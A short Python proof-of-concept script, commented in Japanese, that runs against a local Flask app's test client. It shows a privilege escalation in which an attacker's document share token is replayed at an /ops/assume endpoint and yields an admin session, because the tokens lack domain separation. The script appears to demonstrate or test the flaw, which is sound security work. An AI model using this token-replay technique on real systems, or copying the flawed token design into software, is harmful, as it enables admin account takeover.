# ローカル限定のPoC。共有トークンと assume トークンのドメイン分離欠如を突く
import app as A
c = A.app.test_client()

# 攻撃者を登録（admin は id=1 で投入済みなので、この攻撃者は id=2）
r = c.post("/register", json={"email": "attacker@evil.test"})
attacker_id = r.get_json()["id"]
assert attacker_id == 2, attacker_id

# 攻撃者が自分のドキュメントを作成 → 新しい docs テーブルなので doc id=1
r = c.post("/docs", json={"title": "mine", "body": "hi"}, headers={"X-User": "attacker@evil.test"})
doc_id = r.get_json()["id"]
assert doc_id == 1, doc_id

# 攻撃者が自分のドキュメント(id=1)の共有トークンを正規取得
r = c.post(f"/docs/{doc_id}/share", headers={"X-User": "attacker@evil.test"})
share_token = r.get_json()["token"]
print("[info] share token for doc 1:", share_token[:16], "...")

# 同じトークンを ops/assume に uid=1 として提示 → admin(user 1) として確立
r = c.get(f"/ops/assume?uid=1&t={share_token}")
body = r.get_json()
print("[info] assume response:", body)
assert r.status_code == 200 and body["role"] == "admin" and body["assumed_id"] == 1, body
print("[PASS] share token for doc 1 replayed as assume token for admin user 1 (missing domain separation)")
